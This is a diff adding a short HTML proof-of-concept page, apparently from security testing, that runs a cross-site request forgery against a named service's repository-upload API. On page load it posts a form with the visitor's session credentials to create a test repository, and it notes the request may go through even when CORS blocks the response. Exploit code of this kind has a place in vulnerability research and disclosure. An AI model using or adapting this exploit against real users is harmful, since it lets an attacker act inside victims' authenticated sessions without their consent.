@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>H-AK7 Upload CSRF Test</title></head>
+<body>
+<h1>H-AK7 Upload CSRF Test</h1>
+<p id="status">Running...</p>
+<script>
+async function run() {
+  const status = document.getElementById("status");
+  try {
+    const fd = new FormData();
+    fd.append("repository_name", "HAK7-TEST-REPO");
+    fd.append("file", new Blob(["HAK7 test file"], {type: "text/plain"}), "hak7-test.txt");
+    const res = await fetch("https://app.aikido.dev/api/scm_integrations/repos/uploadCustomRepository", {
+      method: "POST",
+      credentials: "include",
+      body: fd
+    });
+    status.textContent = "Response status: " + res.status;
+  } catch (e) {
+    status.textContent = "Request failed: " + e.message + " (expected if CORS blocks the response; the server may still have processed it, check the Repositories page for HAK7-TEST-REPO)";
+  }
+}
+run();
+</script>
+</body>
+</html>
